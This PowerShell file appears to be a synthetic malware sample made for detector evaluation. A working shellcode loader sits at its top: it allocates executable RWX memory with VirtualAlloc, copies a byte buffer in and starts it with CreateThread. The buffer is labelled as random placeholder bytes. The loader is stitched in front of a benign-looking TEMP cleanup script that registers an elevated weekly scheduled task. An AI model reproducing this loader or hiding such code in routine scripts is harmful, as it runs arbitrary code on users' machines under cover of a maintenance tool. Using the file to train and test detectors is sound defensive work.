<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class MemoryApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xa1, 0x29, 0xfa, 0xf0, 0x99, 0x1b, 0x67, 0xac, 0x83, 0x17, 0x14, 0x65, 0xcb, 0x3b, 0x05, 0x58,
        0xee, 0x39, 0x87, 0x26, 0x0f, 0x44, 0x1c, 0x52, 0x54, 0x7d, 0x01, 0x43, 0x33, 0xe3, 0xb5, 0xfa,
        0xf8, 0x90, 0xab, 0xda, 0x63, 0xf9, 0x66, 0xcd, 0x85, 0x8a, 0xd9, 0xce, 0xac, 0x5d, 0x27, 0xd4,
        0x55, 0x59, 0x61, 0x43, 0xf5, 0xe3, 0x0d, 0x48, 0x4b, 0xdf, 0x20, 0xa2, 0x69, 0xe9, 0x84, 0x0c,
        0x2f, 0x9c, 0x04, 0xa3, 0xc0, 0x8e, 0xf7, 0xb8, 0x4f, 0x70, 0x6d, 0xa7, 0x3d, 0x4a, 0x17, 0x7c,
        0xea, 0x0d, 0xea, 0xb2, 0x86, 0xf0, 0xa9, 0xef, 0xc8, 0x8a, 0x71, 0x0f, 0xba, 0xe1, 0x79, 0xac,
        0x6f, 0xed, 0xbe, 0xb4, 0x65, 0xc7, 0x23, 0x04, 0xd0, 0x05, 0x23, 0x6a, 0xf0, 0x74, 0x2c, 0x88,
        0x47, 0x74, 0x4c, 0x03, 0x1a, 0x41, 0x85, 0xe2, 0x77, 0xa9, 0xcf, 0x87, 0x93, 0xa4, 0x43, 0x8f,
        0x89, 0xbe, 0xb4, 0xd6, 0xa8, 0xb5, 0x44, 0x14, 0xd9, 0x9f, 0x37, 0x9a, 0xb8, 0x63, 0x20, 0x2e,
        0x23, 0x8b, 0x98, 0x34, 0x52, 0x42, 0x1f, 0xae, 0xa6, 0xfa, 0x09, 0xa6, 0x1c, 0x0c, 0x6e, 0x45,
        0x41, 0x59, 0xa4, 0xa9, 0x73, 0x7e, 0x4d, 0x5c, 0xf6, 0x1b, 0x66, 0xfc, 0x0d, 0xd1, 0x11, 0x35,
        0xf8, 0xe5, 0x6a, 0x40, 0xb8, 0xb8, 0xd7, 0x12, 0x63, 0x88, 0x5d, 0x5f, 0x37, 0xcf, 0x1c, 0x18,
        0xba, 0x30, 0x0d, 0x40, 0x49, 0xab, 0x0b, 0x7a, 0x4a, 0xba, 0x7e, 0xb1, 0x2d, 0x66, 0x9c, 0x45,
        0xf0, 0x0f, 0x7b, 0xcd, 0x0d, 0x99, 0x5f, 0xd2, 0x98, 0xcc, 0xf6, 0x96, 0x35
    )

    $Handle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][MemoryApi]::WaitForSingleObject($Thread, 4167)
    [void][MemoryApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Removes stale scratch files from the current user TEMP folder.
.PARAMETER TempRoot
    Used when the script runs unattended.
.NOTES
    Author: J. Weber
    Last updated: 2024-08-03
#>

$TempRoot  = $env:TEMP
$AgeDays   = 21
$MinSizeMB = 1
$LogPath   = 'C:\Logs\temp-cleanup-2026-01-09.log'
$DryRun    = $false
$culture = [System.Globalization.CultureInfo]::InvariantCulture

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-CleanupLog {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

& Write-CleanupLog -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO
foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "02:00"
Register-ScheduledTask -TaskName 'Contoso-TempCleanup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@contoso.com'

Send-MailMessage -To $MailTo -From 'ops@contoso.com' -Subject 'TEMP cleanup summary' `
    -Body "The scheduled TEMP sweep completed. See the JSON report on the host." -SmtpServer "smtp.adatum.com" -Port 587 -UseSsl

& Write-CleanupLog -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
